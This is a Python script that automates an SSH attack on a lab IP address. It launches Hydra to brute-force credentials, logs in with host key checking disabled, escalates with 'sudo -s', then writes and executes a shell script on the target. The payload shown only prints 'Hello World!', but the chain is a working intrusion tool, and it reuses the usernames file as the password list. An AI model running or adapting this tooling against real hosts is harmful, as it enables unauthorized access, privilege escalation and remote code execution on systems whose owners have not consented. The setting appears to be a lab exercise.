import os
import pexpect
import re
import time
from pexpect import pxssh

def kill_hydra():
	os.system("pkill -f hydra")

def hydra_spawn(ip):
	'''
	Start Hydra and find username and password for IP address
	If username and password found kill hydra 
	Execute collect data method
	'''
	try:
		print("Hydra BruteForce Being Executed")
		command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(ip)	
		child = pexpect.spawn(command)	
		time.sleep(30)
		print("BruteForce Successfully Executed")
		child.close()
		kill_hydra()
		
	except Exception, e:
		print str(e)

	except pexpect.EOF:
		print("BruteForce Executed")
		child.close()
		kill_hydra()		
		
#Make precautions for new key when prompted so
def execute_ssh_login(user,password,ip):
	'''
	SSH directly into the machine using parameters received
	'''
	try:
		print("SSH sudo Login Being Executed")
		ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
		ssh_handle.login(ip, user, password)
		index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])
		
		if index == 0:
			ssh_handle.sendline("yes")
			ssh_handle.sendline(password)
			print("SSH sudo Login Succesful ")
		if index == 1:
			print("SSH sudo Login Succesful ")
	
	except Exception, e:
		print str(e)
	
	except pxssh.ExceptionPxssh as e:
		print("Error")
		print str(e)
	
def execute_ssh_sudo(user,password,ip):
	'''
	SSH directly into the machine using parameters received
	'''
	try:
		print("SSH sudo Login Being Executed") 
		ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
		ssh_handle.login(ip, user, password)
		index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])
		
		if index == 0:
			ssh_handle.sendline("yes")
			ssh_handle.sendline(password)
			ssh_handle.sendline('sudo -s')
			ssh_handle.sendline(password)
			print("SSH sudo Login Succesful ")
			
		if index == 1:
			ssh_handle.sendline('sudo -s')
			ssh_handle.sendline(password)
			print("SSH sudo Login Succesful ")
		
	except Exception, e:
		print str(e)
	
	except pxssh.ExceptionPxssh as e:
		print("Error")
		print str(e)
	

def execute_ssh_create_file(user,password,ip):
	'''
	SSH directly into the machine using parameters received
	'''
	try:
		print("File Being Created")
		
		file_command = """echo '#!/bin/bash' >> exe.sh &&  echo 'echo Hello World!' >> exe.sh"""
		
		ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
		ssh_handle.login(ip, user, password)
		index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])
		
		if index == 0:
			ssh_handle.sendline("yes")
			ssh_handle.sendline(password)
			ssh_handle.sendline('sudo -s')
			ssh_handle.sendline(password)
			ssh_handle.sendline(file_command)
			print("File Succesfully Created")
			
		if index == 1:
			ssh_handle.sendline('sudo -s')
			ssh_handle.sendline(password)
			ssh_handle.sendline(file_command)
			print("File Succesfully Created")
	
	except Exception, e:
		print str(e)
		
	except pxssh.ExceptionPxssh as e:
		print str(e)

def execute_ssh_execute_file(user,password,ip):
	'''
	SSH directly into the machine using parameters received
	'''
	try:
		print("File Being Executed")
		file_command = "bash exe.sh"
		ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
		ssh_handle.login(ip, user, password)
		index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])
	
		if index == 0:
			ssh_handle.sendline("yes")
			ssh_handle.sendline(password)
			ssh_handle.sendline('sudo -s')
			ssh_handle.sendline(password)
			ssh_handle.sendline(file_command)
			print("File Succesfully Executed")
			
		if index == 1:
			ssh_handle.sendline('sudo -s')
			ssh_handle.sendline(password)
			ssh_handle.sendline(file_command)
			print("File Succesfully Executed")
		
	except Exception, e:
		print str(e)
		
	except pxssh.ExceptionPxssh as e:
		print str(e)

if __name__ == "__main__":
	#hydra_spawn("10.0.5.37")
	execute_ssh_create_file("ubuntu","ubuntu","10.0.5.37")

